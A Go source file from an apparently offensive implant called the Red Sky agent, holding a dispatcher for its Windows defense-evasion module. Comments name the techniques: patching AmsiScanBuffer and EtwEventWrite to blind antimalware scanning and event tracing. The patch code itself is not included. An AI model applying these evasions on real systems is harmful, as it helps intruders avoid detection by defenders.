// Package evade is the userland defense-evasion layer for the Red Sky agent.
//
// Windows:
//   - AMSI patch (AmsiScanBuffer -> return E_INVALIDARG)
//   - ETW patch (EtwEventWrite -> ret)
//   - (future) NTDLL unhook, indirect syscalls
//
// Linux/macOS:
//   - no-op. The Go agent is a static binary. No userland hooks to defeat.
//
// Init() runs the platform-appropriate chain. It never fails fatally: if a
// patch doesn't apply, the agent keeps running and the operator sees the
// failure in the startup log.
package evade

import (
	"os"
	"runtime"
)

// Result is one evasion technique's outcome.
type Result struct {
	Name    string
	Applied bool
	Detail  string
}

// Init runs every evasion technique applicable to this platform.
// Honors NO_EVASION=1 in the environment to skip everything (useful for
// debugging or when running in a sandbox you control).
func Init() []Result {
	if os.Getenv("NO_EVASION") == "1" {
		return []Result{{Name: "all", Applied: false, Detail: "NO_EVASION=1"}}
	}
	switch runtime.GOOS {
	case "windows":
		return initWindows()
	default:
		return []Result{{Name: "platform", Applied: false, Detail: runtime.GOOS + " has no userland evasion surface"}}
	}
}
